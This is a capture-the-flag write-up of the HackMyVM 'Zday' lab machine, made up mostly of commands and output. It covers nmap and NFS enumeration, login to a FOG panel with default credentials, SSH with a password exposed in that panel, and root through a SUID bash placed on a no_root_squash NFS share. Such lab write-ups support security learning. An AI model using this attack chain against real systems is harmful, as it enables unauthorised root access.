# CTF Penetration Testing

## HackMyVM

### Zday - Machine

#### Machine Description

- Machine name: [Zday](https://hackmyvm.eu/machines/machine.php?vm=Zday)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟥 Hard

<img src="https://hackmyvm.eu/img/vm/zday.png" alt="Zday Machine Logo" width="150"/>

#### Tools Used

- Burp Suite
- curl
- ffuf
- Gobuster
- Nmap

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.141 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.141`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 11:30 CEST
Warning: 192.168.56.141 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.56.141
Host is up (0.00056s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3 ←
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) ←
80/tcp    open  http     Apache httpd 2.4.38 ((Debian)) ←
111/tcp   open  rpcbind  2-4 (RPC #100000)
443/tcp   open  http     Apache httpd 2.4.38 ←
2049/tcp  open  nfs      3-4 (RPC #100003) ←
3306/tcp  open  mysql    MySQL 5.5.5-10.3.27-MariaDB-0+deb10u1 ←
33755/tcp open  mountd   1-3 (RPC #100005)
34117/tcp open  mountd   1-3 (RPC #100005)
36009/tcp open  mountd   1-3 (RPC #100005)
39821/tcp open  nlockmgr 1-4 (RPC #100021)
MAC Address: 08:00:27:0A:C0:06 (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.89 seconds
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[2049 - Pentesting NFS Service](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)

[**#Useful nmap scripts**]

```
nfs-ls #List NFS exports and check permissions
nfs-showmount #Like showmount -e
nfs-statfs #Disk statistics and info from NFS share
```

[**#Useful metasploit modules**]

```
scanner/nfs/nfsmount #Scan NFS mounts and list permissions
```

[**#Mounting**]

To know **which folder** has the server **available** to mount you an ask it using:
```
showmount -e <IP>
```
Then mount it using:
```
mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
```
You should specify to **use version 2** because it doesn't have **any** **authentication** or **authorization**. **Example:**
```
mkdir /mnt/new_back
mount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`showmount -e 192.168.56.141`:
```
Export list for 192.168.56.141:
/images/dev * ←
/images     * ←
```

`mkdir ./nfs-images`

`mkdir ./nfs-images-dev`

`mount -t nfs 192.168.56.141:images ./nfs-images -o nolock`

`mount -t nfs 192.168.56.141:/images/dev ./nfs-images-dev -o nolock`

`cd ./nfs-images`

`ls -alps ./`:
```                                                              
total 16
4 drwxrwxrwx  4 nVbla root 4096 Mar 10  2021 ./
4 drwx------ 37 kali  kali 4096 Oct 15 16:54 ../
4 drwxrwxrwx  3 nVbla root 4096 Mar 10  2021 dev/
0 -rwxrwxrwx  1 nVbla root    0 Mar 10  2021 .mntcheck
4 drwxrwxrwx  2 nVbla root 4096 Mar 10  2021 postdownloadscripts/
```

`tree ./`:
``` 
./
├── dev
│   └── postinitscripts
│       └── fog.postinit
└── postdownloadscripts
    └── fog.postdownload

4 directories, 2 files
```

`whatweb -a 3 -v http://192.168.56.141`:
```
WhatWeb report for http://192.168.56.141
Status    : 200 OK
Title     : Apache2 Debian Default Page: It works
IP        : 192.168.56.141
Country   : RESERVED, ZZ

Summary   : Apache[2.4.38], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.38 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Debian Linux
        String       : Apache/2.4.38 (Debian) (from server string)

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Tue, 15 Oct 2024 09:32:45 GMT
        Server: Apache/2.4.38 (Debian)
        Last-Modified: Wed, 10 Mar 2021 09:30:06 GMT
        ETag: "29cd-5bd2b4ff4650f-gzip"
        Accept-Ranges: bytes
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 3041
        Connection: close
        Content-Type: text/html
```

`curl -s http://192.168.56.141`:
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Debian Default Page: It works</title>

[...]
```

`gobuster dir -u http://192.168.56.141 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 15`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.141
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   500,400,401,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,zip,html,php,bak,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 302) [Size: 0] [--> /fog/index.php] ←
/.html                (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 10701]
/.php                 (Status: 403) [Size: 279]
/fog                  (Status: 301) [Size: 314] [--> http://192.168.56.141/fog/]

[...]
```

`curl -v http://192.168.56.141/fog/index.php`:
```
*   Trying 192.168.56.141:80...
* Connected to 192.168.56.141 (192.168.56.141) port 80
> GET /fog/index.php HTTP/1.1
> Host: 192.168.56.141
> User-Agent: curl/8.8.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 302 Found
< Date: Tue, 15 Oct 2024 10:30:17 GMT
< Server: Apache/2.4.38 (Debian)
< Location: ./management/index.php ←
< Content-Length: 0
< Connection: close
< Content-Type: text/html; charset=UTF-8
< 
* Closing connection
```

`curl -s http://192.168.56.141/fog/management/index.php`:
```html
[...]

<div class="form-signin">
  <form class="form-horizontal" method="post" action="?node=home">
    <h3 class="form-signin-heading text-center">
      <span class="col-xs-1">
        <img src="../favicon.ico" class="logoimg" alt="Open Source Computer Cloning Solution"/>
      </span>
      FOG Project
    </h3>
    <hr/>
    <div class="form-group">
      <label class="control-label col-md-2" for="uname">Username</label> ←
      <div class="col-md-10">
        <input type="text" class="form-control" name="uname" required="" autofocus="" id="uname"/>
      </div>
    </div>
    <div class="form-group">
      <label class="control-label col-md-2" for="upass">Password</label> ←
      <div class="col-md-10">
        <input type="password" class="form-control" name="upass" required="" id="upass"/>
      </div>
    </div>
    <div class="form-group">
      <label class="control-label col-md-2" for="ulang">Language</label>
      <div class="col-md-10">
        <select class="form-control" name="ulang" id="ulang">
          <option value="中国的">中国的</option>
          <option value="English" selected>English</option>
          <option value="Español">Español</option>
          <option value="Français">Français</option>
          <option value="Deutsch">Deutsch</option>
          <option value="Italiano">Italiano</option>
          <option value="Português">Português</option>
        </select>
      </div>
    </div>
    <div class="form-group">
      <div class="col-md-offset-2 col-md-10">
        <button class="btn btn-default btn-block" type="submit" name="login">Login</button> ←
      </div>
    </div>
  </form>
</div>

[...]
```

`firefox` > `http://192.168.56.141/fog/management/index.php`

`burpsuite`

`HTTP Request`:
```http
POST /fog/management/index.php?node=home HTTP/1.1
Host: 192.168.56.141
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: http://192.168.56.141
Connection: close
Referer: http://192.168.56.141/fog/management/index.php
Cookie: PHPSESSID=o1m0o3kuh631a6ujhethlm7ccm
Upgrade-Insecure-Requests: 1

uname=TEST&upass=TEST&ulang=English&login= ←
```
`HTTP Response`:
```http
HTTP/1.1 200 OK
Date: Tue, 15 Oct 2024 10:37:50 GMT
Server: Apache/2.4.38 (Debian)
X-Frame-Options: sameorigin
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000
Content-Security-Policy: default-src 'none';script-src 'self' 'unsafe-eval';connect-src 'self';img-src 'self' data:;style-src 'self' 'unsafe-inline';font-src 'self';
Access-Control-Allow-Origin: *
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 6057
Connection: close
Content-Type: text/html; charset=UTF-8

[...]

<div class="form-signin">
  <form class="form-horizontal" method="post" action="?node=home">
    <h3 class="form-signin-heading text-center">
      <span class="col-xs-1">
        <img src="../favicon.ico" class="logoimg" alt="Open Source Computer Cloning Solution"/>
      </span>
      FOG Project
    </h3>
    <hr/>
    <div class="form-group">
      <label class="control-label col-md-2" for="uname">Username</label> ←
      <div class="col-md-10">
        <input type="text" class="form-control" name="uname" required="" autofocus="" id="uname"/>
      </div>
    </div>
    <div class="form-group">
      <label class="control-label col-md-2" for="upass">Password</label> ←
      <div class="col-md-10">
        <input type="password" class="form-control" name="upass" required="" id="upass"/>
      </div>
    </div>
    <div class="form-group">
      <label class="control-label col-md-2" for="ulang">Language</label>
      <div class="col-md-10">
        <select class="form-control" name="ulang" id="ulang">
          <option value="中国的">中国的</option>
          <option value="English" selected>English</option>
          <option value="Español">Español</option>
          <option value="Français">Français</option>
          <option value="Deutsch">Deutsch</option>
          <option value="Italiano">Italiano</option>
          <option value="Português">Português</option>
        </select>
      </div>
    </div>
    <div class="form-group">
      <div class="col-md-offset-2 col-md-10">
        <button class="btn btn-default btn-block" type="submit" name="login">Login</button> ←
      </div>
    </div>
  </form>
</div>

[...]
```

<div>
	<img src="./assets/logo_google.png" alt="Google Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>Google</strong></span>
</div>

[FOG Wiki](https://wiki.fogproject.org/wiki/index.php?title=Password_Central)

[**#Web Interface**]

Default username is fog
Default password is password
If you lose this password, and you have root access to the main fog server, you can reset it to the default via CLI.

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`curl -s "http://192.168.56.141/fog/management/index.php?node=home" -d "uname=fog&upass=password&ulang=English&login=" -L`:
```
*   Trying 192.168.56.141:80...
* Connected to 192.168.56.141 (192.168.56.141) port 80
> POST /fog/management/index.php?node=home HTTP/1.1
> Host: 192.168.56.141
> User-Agent: curl/8.8.0
> Accept: */*
> Content-Length: 45
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 45 bytes
< HTTP/1.1 302 Found ←
< Date: Tue, 15 Oct 2024 10:41:47 GMT
< Server: Apache/2.4.38 (Debian)
< Content-Security-Policy: default-src 'none';script-src 'self' 'unsafe-eval';connect-src 'self';img-src 'self' data:;style-src 'self' 'unsafe-inline';font-src 'self';
< Access-Control-Allow-Origin: *
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Strict-Transport-Security: "max-age=15768000"
< X-Content-Type-Options: nosniff
< X-XSS-Protection: 1; mode=block
< X-Robots-Tag: none
< X-Frame-Options: SAMEORIGIN
< Set-Cookie: PHPSESSID=u73mg8ga33t8fft17is94o55g1; path=/
* Need to rewind upload for next request
< Location: index.php?node=home
< Content-Length: 0
< Connection: close
< Content-Type: text/html; charset=UTF-8
< 
* Closing connection
* Issue another request to this URL: 'http://192.168.56.141/fog/management/index.php?node=home'
* Switch from POST to GET
* Hostname 192.168.56.141 was found in DNS cache
*   Trying 192.168.56.141:80...
* Connected to 192.168.56.141 (192.168.56.141) port 80
> GET /fog/management/index.php?node=home HTTP/1.1
> Host: 192.168.56.141
> User-Agent: curl/8.8.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK ←
< Date: Tue, 15 Oct 2024 10:41:47 GMT
< Server: Apache/2.4.38 (Debian)
< X-Frame-Options: sameorigin
< X-XSS-Protection: 1; mode=block
< X-Content-Type-Options: nosniff
< Strict-Transport-Security: max-age=31536000
< Content-Security-Policy: default-src 'none';script-src 'self' 'unsafe-eval';connect-src 'self';img-src 'self' data:;style-src 'self' 'unsafe-inline';font-src 'self';
< Access-Control-Allow-Origin: *
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Set-Cookie: PHPSESSID=hq4smdjdhprqe8in6atvnf76lu; path=/ ←
< Vary: Accept-Encoding
< Connection: close
< Transfer-Encoding: chunked
< Content-Type: text/html; charset=UTF-8
< 

[...]
```

`firefox` > `http://192.168.56.141/fog/management/index.php` > `Storage` > `DefaultMember`:
| Campo                        | Valore                             |
|------------------------------|------------------------------------|
| Storage Node Name             | DefaultMember                     |
| Storage Node Description      | Auto generated fog nfs group member|
| IP Address                    | 192.168.1.123                     |
| Web root                      | /fog                              |
| Max Clients                   | 10                                |
| Is Master Node                | ✔                                 |
| Replication Bandwidth (Kbps)  | 0                                 |
| Storage Group                 | default - (1)                     |
| Image Path                    | /images                           |
| FTP Path                      | /images                           |
| Snapin Path                   | /opt/fog/snapins                  |
| SSL Path                      | /opt/fog/snapins/ssl              |
| Bitrate                       |                                   |
| Remit Hello Interval          |                                   |
| Interface                     | enp0s3                            |
| Is Enabled                    | ✔                                |
| Is Graph Enabled (On Dashboard)| ✔                                |
| Management Username           | fogproject                        |
| Management Password           | 84D1gia!8M9HSsR8gXau              |

`ssh fogproject@192.168.56.141`:
```
fogproject@192.168.56.141's password: ←
Linux zday 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You seem to be using the 'fogproject' system account to logon and work 
on your FOG server system.

It's NOT recommended to use this account! Please create a new 
account for administrative tasks.

If you re-run the installer it would reset the 'fog' account 
password and therefore lock you out of the system!

Take care, 
your FOGproject team
Connection to 192.168.56.141 closed.
```

`ssh fogproject@192.168.56.141 -t /bin/sh`:
```
fogproject@192.168.56.141's password: ←
```

![Victim: fogproject](https://img.shields.io/badge/Victim-fogproject-64b5f6?logo=linux&logoColor=white)

`/bin/bash`:
```
You seem to be using the 'fogproject' system account to logon and work 
on your FOG server system.

It's NOT recommended to use this account! Please create a new 
account for administrative tasks.

If you re-run the installer it would reset the 'fog' account 
password and therefore lock you out of the system!

Take care, 
your FOGproject team
```

`whoami`:
```
fogproject ←
```

`id`:
```
uid=1001(fogproject) gid=1001(fogproject) groups=1001(fogproject)
```

`uname -a`:
```
Linux zday 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster
```

`cd /home/fogproject`

`ls -alps ./`:
```
total 32
4 drwxr-xr-x 4 fogproject fogproject 4096 Oct 15 10:23 ./
4 drwxr-xr-x 4 root       root       4096 Mar 10  2021 ../
4 -rw-r--r-- 1 fogproject fogproject  220 Apr 18  2019 .bash_logout
4 -rw-r--r-- 1 fogproject fogproject 3899 Mar 10  2021 .bashrc
4 drwxr-xr-x 3 fogproject fogproject 4096 Mar 10  2021 .config/
4 drwx------ 3 fogproject fogproject 4096 Oct 15 10:23 .gnupg/
4 -rw-r--r-- 1 fogproject fogproject  807 Apr 18  2019 .profile
4 -rwxr-xr-x 1 fogproject fogproject  681 Mar 10  2021 warnfogaccount.sh
```

`file ./warnfogaccount.sh`:
```
warnfogaccount.sh: Bourne-Again shell script, ASCII text executable, with very long lines
```

`cat ./warnfogaccount.sh`:
```bash
#!/bin/bash
title="FOG system account"
text="You seem to be using the 'fogproject' system account to logon and work \non your FOG server system.\n\nIt's NOT recommended to use this account! Please create a new \naccount for administrative tasks.\n\nIf you re-run the installer it would reset the 'fog' account \npassword and therefore lock you out of the system!\n\nTake care, \nyour FOGproject team"
z=$(which zenity)
x=$(which xmessage)
n=$(which notify-send)
if [[ -x "$z" ]]
then
    $z --error --width=480 --text="$text" --title="$title"
elif [[ -x "$x" ]]
then
    echo -e "$text" | $x -center -file -
else
    $n -u critical "$title" "$(echo $text | sed -e 's/ \n/ /g')"
fi
```

`ls -alps /var/www/html`:
```
total 28
 4 drwxr-xr-x  3 root     root      4096 Mar 10  2021 ./
 4 drwxr-xr-x  3 root     root      4096 Mar 10  2021 ../
 4 drwxr-xr-x 10 www-data www-data  4096 Mar 10  2021 fog/
12 -rw-r--r--  1 root     root     10701 Mar 10  2021 index.html
 4 -rw-r--r--  1 www-data www-data    52 Mar 10  2021 index.php
```

`ls -alps /home`:
```
total 16
4 drwxr-xr-x  4 root       root       4096 Mar 10  2021 ./
4 drwxr-xr-x 21 root       root       4096 Mar 10  2021 ../
4 drwxr-xr-x  3 estas      estas      4096 Mar 10  2021 estas/ ←
4 drwxr-xr-x  4 fogproject fogproject 4096 Oct 15 10:23 fogproject/
```

`ls -alps /home/estas`:
```
total 36
4 drwxr-xr-x 3 estas estas 4096 Mar 10  2021 ./
4 drwxr-xr-x 4 root  root  4096 Mar 10  2021 ../
4 -rw-r--r-- 1 estas estas  220 Mar 10  2021 .bash_logout
4 -rw-r--r-- 1 estas estas 3526 Mar 10  2021 .bashrc
4 -rwx--x--x 1 estas estas 1920 Mar 10  2021 flag.sh
4 drwxr-xr-x 3 estas estas 4096 Mar 10  2021 .local/
4 -rw-r--r-- 1 estas estas  807 Mar 10  2021 .profile
4 -rw------- 1 estas estas   15 Mar 10  2021 user.txt
4 -rw------- 1 estas estas  100 Mar 10  2021 .Xauthority
```
 
<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[2049 - Pentesting NFS Service](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)

[**#Config files**]

```
/etc/exports
/etc/lib/nfs/etab
```

[**#Dangerous settings**]

- **Read and Write Permissions (**`**rw**`**):** This setting allows both reading from and writing to the file system. It's essential to consider the implications of granting such broad access.
- **Use of Insecure Ports (**`**insecure**`**):** When enabled, this allows the system to utilize ports above 1024. The security of ports above this range can be less stringent, increasing risk.
- **Visibility of Nested File Systems (**`**nohide**`**):** This configuration makes directories visible even if another file system is mounted below an exported directory. Each directory requires its own export entry for proper management.
- **Root Files Ownership (**`**no_root_squash**`**):** With this setting, files created by the root user maintain their original UID/GID of 0, disregarding the principle of least privilege and potentially granting excessive permissions.
- **Non-Squashing of All Users (**`**no_all_squash**`**):** This option ensures that user identities are preserved across the system, which could lead to permission and access control issues if not correctly handled.

![Victim: fogproject](https://img.shields.io/badge/Victim-fogproject-64b5f6?logo=linux&logoColor=white)

`cat /etc/exports`:
```
/images *(ro,sync,no_wdelay,no_subtree_check,insecure_locks,no_root_squash,insecure,fsid=0)
/images/dev *(rw,async,no_wdelay,no_subtree_check,no_root_squash,insecure,fsid=1) ←
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[NFS no_root_squash/no_all_squash misconfiguration PE](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)

[**#Remote Exploit**]

If you have found this vulnerability, you can exploit it:
- **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder the **/bin/bash** binary and giving it **SUID** rights, and **executing from the victim** machine that bash binary.
```
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
- **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary (you can find here some [C SUID payloads](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/payloads-to-execute#c)).
```
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cd ./nfs-images-dev`

`scp fogproject@191.168.56.141:/bin/bash ./`:
```
bash                                             100% 1141KB  22.0MB/s   00:00 ←
```

`ls -l ./`:
```                                                                 
total 1148
-rwxr-xr-x 1 kali  kali 1168776 Oct 15 17:11 bash ←
drwxrwxrwx 2 nVbla root    4096 Mar 10  2021 postinitscripts
```

`chown root:root ./bash`

`chmod 4755 ./bash`

`ls -l ./`:
```
total 1148
-rwsr-xr-x 1 root  root 1168776 Oct 15 17:11 bash ←
drwxrwxrwx 2 nVbla root    4096 Mar 10  2021 postinitscripts
```

![Victim: fogproject](https://img.shields.io/badge/Victim-fogproject-64b5f6?logo=linux&logoColor=white)

`cd /images/dev`

`ls -alps ./`:
```
total 1156
   4 drwxrwxrwx 3 fogproject root    4096 Oct 15 11:11 ./
   4 drwxrwxrwx 4 fogproject root    4096 Mar 10  2021 ../
1144 -rwsr-xr-x 1 root       root 1168776 Oct 15 11:11 bash ←
   0 -rwxrwxrwx 1 fogproject root       0 Mar 10  2021 .mntcheck
   4 drwxrwxrwx 2 fogproject root    4096 Mar 10  2021 postinitscripts/
```

`./bash -p`

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`id`:
```
uid=1001(fogproject) gid=1001(fogproject) euid=0(root) groups=1001(fogproject) ←
```

`cd /root`

`ls -alps`:
```
total 32
4 drwx------  3 root root 4096 Mar 10  2021 ./
4 drwxr-xr-x 21 root root 4096 Mar 10  2021 ../
4 -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
4 -rwx--x--x  1 root root 1920 Mar 10  2021 flag.sh
4 drwxr-xr-x  3 root root 4096 Mar 10  2021 .local/
4 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
4 -rw-------  1 root root   20 Mar 10  2021 root.txt ←
4 -rw-r--r--  1 root root  209 Mar 10  2021 .wget-hsts
```

`cat ./root.txt`:
```
ihave************** ←
```

`ls -alps /home/estas`:
```
total 36
4 drwxr-xr-x 3 estas estas 4096 Mar 10  2021 ./
4 drwxr-xr-x 4 root  root  4096 Mar 10  2021 ../
4 -rw-r--r-- 1 estas estas  220 Mar 10  2021 .bash_logout
4 -rw-r--r-- 1 estas estas 3526 Mar 10  2021 .bashrc
4 -rwx--x--x 1 estas estas 1920 Mar 10  2021 flag.sh
4 drwxr-xr-x 3 estas estas 4096 Mar 10  2021 .local/
4 -rw-r--r-- 1 estas estas  807 Mar 10  2021 .profile
4 -rw------- 1 estas estas   15 Mar 10  2021 user.txt ←
4 -rw------- 1 estas estas  100 Mar 10  2021 .Xauthority
```

`cat /home/estas/user.txt`:
```
where********* ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
